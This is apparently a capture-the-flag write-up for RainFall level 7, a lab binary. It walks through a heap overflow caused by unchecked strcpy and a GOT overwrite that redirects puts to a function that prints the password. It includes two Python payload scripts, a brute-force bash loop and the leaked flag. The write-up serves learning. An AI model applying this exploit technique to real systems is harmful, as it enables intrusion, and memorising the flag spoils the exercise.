<h1 align="center"> LEVEL 7 </h1>

## 🔍 Analysis of Decompiled [level7](./source.c)
What's happening in the code

This program appears to take two command-line arguments, stores them in malloced memory, and copies them using strcpy():
```
strcpy((char *)puVar1[1], *(char **)(param_2 + 4));  // argv[1]
strcpy((char *)puVar3[1], *(char **)(param_2 + 8));  // argv[2]
```
Then it reads a secret file into a global variable c:
```
fgets(c, 0x44, __stream);  // Read password into c
puts('~~')
```
The goal is to somehow call the m() function, which prints c, thus leaking the password.
```
printf("%s - %d\n", c, time(0));
```
So the input is directly copied into malloc'd memory, with no length checking. This is a classic heap-based *buffer overflow*.

## How to exploit it
### overwriting the GOT entry for puts(), which the program does definitely call right after reading the password.
After reading the secret into c, main() does:
If you overwrite the GOT slot for puts with the address of m, then:
```
puts("~~");
```
becomes effectively:
```
m("~~", /*garbage*/, /*garbage*/, /*garbage*/, /*garbage*/);
```
## 💥 Exploit 
### Find the puts@GOT address
```
level7@RainFall:~$ readelf -r ./level7 | grep ' R_386_JUMP_SLOT.*puts'
08049928  00000607 R_386_JUMP_SLOT   00000000   puts
```
### Find the address of m()
```
gdb ./level7
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>

```

## Two-Stage Heap Overflow → GOT Overwrite

Chunk A (8 bytes) → contains [1, ptr_to_B]

Chunk B (8 bytes) → destination of argv[1]

Chunk C (8 bytes) → contains [2, ptr_to_D]

Chunk D (8 bytes) → destination of argv[2]

### Stage 1: Overflow Chunk B to point b[1] at puts@GOT
```
#!/usr/bin/env python2
import sys
from struct import pack

if len(sys.argv) != 3:
    sys.stderr.write("Usage: %s <pad_len> <got_addr_hex>\n" % sys.argv[0])
    sys.exit(1)

pad_len = int(sys.argv[1])
got_addr = int(sys.argv[2], 16)

payload  = b"A" * pad_len
payload += pack("<I", got_addr)
sys.stdout.write(payload)
```
### stage2: Overflow Chunk D to write m() into puts@GOT
```
#!/usr/bin/env python2
import sys
from struct import pack

m_addr = 0x080484f4
sys.stdout.write(pack("<I", m_addr) + "\x00")
```
### We’ll then make a simple bash loop to try pad values from 8 up to, say, 20.
```
for pad in $(seq 8 20); do
  echo "=== Trying pad = $pad ==="
  ./level7 "$(./stage1.py $pad 0x08049928)" "$(./stage2.py)"
  echo
done
```
after executing it:
=== Trying pad = 8 ===
~~

=== Trying pad = 9 ===
~~
...

=== Trying pad = 18 ===
Segmentation fault (core dumped)

=== Trying pad = 19 ===
Segmentation fault (core dumped)

=== Trying pad = 20 ===
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1754601545
